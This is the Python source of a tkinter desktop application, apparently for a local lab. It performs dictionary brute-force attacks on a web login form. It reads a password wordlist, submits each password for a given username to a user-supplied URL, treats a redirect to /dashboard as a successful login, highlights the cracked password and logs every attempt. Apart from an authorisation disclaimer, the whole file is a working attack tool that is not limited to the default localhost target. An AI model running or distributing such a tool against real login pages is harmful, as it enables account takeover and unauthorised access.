"""
Simple password tester GUI

Usage:
- Make sure the target web app is running (default: http://127.0.0.1:5000).
- Select a text file with one password per line using "Select File".
- Enter the username to test.
- Click "Start Test" to try each password and log results.

Requires: requests (pip install requests)

Note: Only use this tool against systems you own or are authorized to test.
"""

import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import threading
import requests
import time
import os
from datetime import datetime


class PasswordTesterApp:
    def __init__(self, master):
        self.master = master
        master.title("Password Tester")
        master.geometry("800x600")

        # Top frame for controls
        ctrl = tk.Frame(master)
        ctrl.pack(fill=tk.X, padx=8, pady=6)

        tk.Label(ctrl, text="Target URL:").grid(row=0, column=0, sticky=tk.W)
        self.url_var = tk.StringVar(value="http://127.0.0.1:5000/login")
        self.url_entry = tk.Entry(ctrl, textvariable=self.url_var, width=50)
        self.url_entry.grid(row=0, column=1, columnspan=3, sticky=tk.W, padx=(6, 0))

        tk.Label(ctrl, text="Username:").grid(row=1, column=0, sticky=tk.W, pady=(6,0))
        self.username_var = tk.StringVar()
        self.username_entry = tk.Entry(ctrl, textvariable=self.username_var, width=30)
        self.username_entry.grid(row=1, column=1, sticky=tk.W, pady=(6,0))

        self.select_btn = tk.Button(ctrl, text="Select Password File", command=self.select_file)
        self.select_btn.grid(row=1, column=2, padx=(6,0), pady=(6,0))

        self.start_btn = tk.Button(ctrl, text="Start Test", command=self.start_test, state=tk.DISABLED)
        self.start_btn.grid(row=1, column=3, padx=(6,0), pady=(6,0))
        # Option: stop after first success
        self.stop_after_var = tk.BooleanVar(value=True)
        self.stop_after_check = tk.Checkbutton(ctrl, text="Stop after first success", variable=self.stop_after_var)
        self.stop_after_check.grid(row=1, column=4, padx=(6,0), pady=(6,0))

        # Middle: file content
        file_frame = tk.LabelFrame(master, text="Passwords (file content)")
        file_frame.pack(fill=tk.BOTH, expand=False, padx=8, pady=(0,6))
        self.file_text = scrolledtext.ScrolledText(file_frame, height=10)
        self.file_text.pack(fill=tk.BOTH, expand=True)
        self.file_text.config(state=tk.DISABLED)

        # Results
        res_frame = tk.LabelFrame(master, text="Results / Log")
        res_frame.pack(fill=tk.BOTH, expand=True, padx=8, pady=(0,8))
        self.log_text = scrolledtext.ScrolledText(res_frame)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)

        # Bottom controls
        bottom = tk.Frame(master)
        bottom.pack(fill=tk.X, padx=8, pady=(0,8))
        self.progress_var = tk.StringVar(value="Idle")
        tk.Label(bottom, textvariable=self.progress_var).pack(side=tk.LEFT)

        self.save_btn = tk.Button(bottom, text="Save Log", command=self.save_log, state=tk.DISABLED)
        self.save_btn.pack(side=tk.RIGHT)

        # Internal
        self.passwords = []
        self.running = False
        self.session = None
        self.results_path = None

    def select_file(self):
        path = filedialog.askopenfilename(title="Select password file", filetypes=[("Text files","*.txt"), ("All files","*.*")])
        if not path:
            return
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                lines = [l.rstrip("\n\r") for l in f]
        except Exception as e:
            messagebox.showerror("Error", f"Failed to read file: {e}")
            return
        self.passwords = [l for l in (p.strip() for p in lines) if l]
        # Display only the filtered passwords (no empty lines) so line numbers match
        display_lines = self.passwords
        self.file_text.config(state=tk.NORMAL)
        self.file_text.delete("1.0", tk.END)
        self.file_text.insert(tk.END, "\n".join(display_lines))
        self.file_text.config(state=tk.DISABLED)
        self.start_btn.config(state=tk.NORMAL if self.passwords else tk.DISABLED)
        # Save results into the folder where this script lives (BruteForce\logs folder)
        script_dir = os.path.dirname(os.path.abspath(__file__))
        logs_dir = os.path.join(script_dir, "logs")
        os.makedirs(logs_dir, exist_ok=True)
        self.results_path = os.path.join(logs_dir, f"bruteforce_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        self.log(f"Loaded {len(self.passwords)} passwords from {path}")
        self.save_btn.config(state=tk.DISABLED)

    def start_test(self):
        if not self.passwords:
            messagebox.showinfo("No passwords", "Please select a password file first.")
            return
        username = self.username_var.get().strip()
        if not username:
            messagebox.showinfo("No username", "Please enter the username to test.")
            return
        target = self.url_var.get().strip()
        if not target:
            messagebox.showinfo("No URL", "Please enter the target login URL.")
            return
        # disable controls
        self.select_btn.config(state=tk.DISABLED)
        self.start_btn.config(state=tk.DISABLED)
        self.running = True
        self.progress_var.set("Running...")
        self.session = requests.Session()
        stop_after = bool(self.stop_after_var.get())
        thread = threading.Thread(target=self._run_tests, args=(username, target, stop_after), daemon=True)
        thread.start()

    def _run_tests(self, username, target, stop_after_first):
        total = len(self.passwords)
        succeeded = 0
        for idx, pw in enumerate(self.passwords, start=1):
            if not self.running:
                self._append_log_line("Stopped by user")
                break
            start = time.time()
            try:
                # POST form fields 'username' and 'password' as used by the Flask app
                resp = self.session.post(target, data={"username": username, "password": pw}, allow_redirects=True, timeout=10)
            except Exception as e:
                took = time.time() - start
                self._append_log_line(f"{idx}/{total} - ERROR - {repr(e)}")
                self._write_result(username, pw, False, f"ERROR: {e}", took)
                continue
            took = time.time() - start
            success = False
            try:
                final_url = resp.url or ""
                # If the app redirects to /dashboard on successful login, final_url will include '/dashboard'
                if "/dashboard" in final_url:
                    success = True
            except Exception:
                success = False
            if success:
                succeeded += 1
                self._append_log_line(f"{idx}/{total} - SUCCESS - {pw} ({took:.2f}s)")
                self._write_result(username, pw, True, "OK", took)
                # Highlight the successful password in the file view
                try:
                    self.master.after(0, lambda p=pw: self._highlight_password(p))
                except Exception:
                    pass
                if stop_after_first:
                    # stop testing after the first successful attempt
                    break
            else:
                # Could also look for flash 'Invalid username or password' in resp.text
                self._append_log_line(f"{idx}/{total} - FAIL    - {pw} ({took:.2f}s)")
                self._write_result(username, pw, False, "FAIL", took)
            # small delay to be polite
            time.sleep(0.1)
        self._append_log_line(f"Finished. {succeeded} succeeded out of {total} tried.")
        self._finish_run()

    def _highlight_password(self, password):
        """Highlight the first occurrence of `password` in the displayed file list."""
        try:
            # find index in the loaded passwords list
            idx = self.passwords.index(password)
        except ValueError:
            return
        line_no = idx + 1
        try:
            self.file_text.config(state=tk.NORMAL)
            # remove previous highlight
            self.file_text.tag_remove("highlight", "1.0", tk.END)
            self.file_text.tag_configure("highlight", background="#fff59d")
            # highlight the entire line
            self.file_text.tag_add("highlight", f"{line_no}.0", f"{line_no}.end")
            self.file_text.see(f"{line_no}.0")
        finally:
            self.file_text.config(state=tk.DISABLED)

    def _write_result(self, username, password, success, note, took):
        try:
            line = f"{datetime.now().isoformat()}\t{username}\t{password}\t{int(success)}\t{note}\t{took:.3f}\n"
            with open(self.results_path, "a", encoding="utf-8") as f:
                f.write(line)
        except Exception as e:
            self._append_log_line(f"Error writing results file: {e}")

    def _append_log_line(self, line):
        # schedule onto the tkinter mainloop
        self.master.after(0, lambda: self._append_log(line))

    def _append_log(self, line):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, line + "\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    def log(self, text):
        self._append_log_line(text)

    def _finish_run(self):
        self.running = False
        self.master.after(0, self._on_finished)

    def _on_finished(self):
        self.select_btn.config(state=tk.NORMAL)
        self.start_btn.config(state=tk.NORMAL if self.passwords else tk.DISABLED)
        self.progress_var.set("Idle")
        self.save_btn.config(state=tk.NORMAL)

    def save_log(self):
        path = filedialog.asksaveasfilename(title="Save log as", defaultextension=".txt", filetypes=[("Text files","*.txt"), ("All files","*.*")])
        if not path:
            return
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(self.log_text.get("1.0", tk.END))
            messagebox.showinfo("Saved", f"Log saved to {path}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save log: {e}")


if __name__ == "__main__":
    root = tk.Tk()
    app = PasswordTesterApp(root)
    root.mainloop()
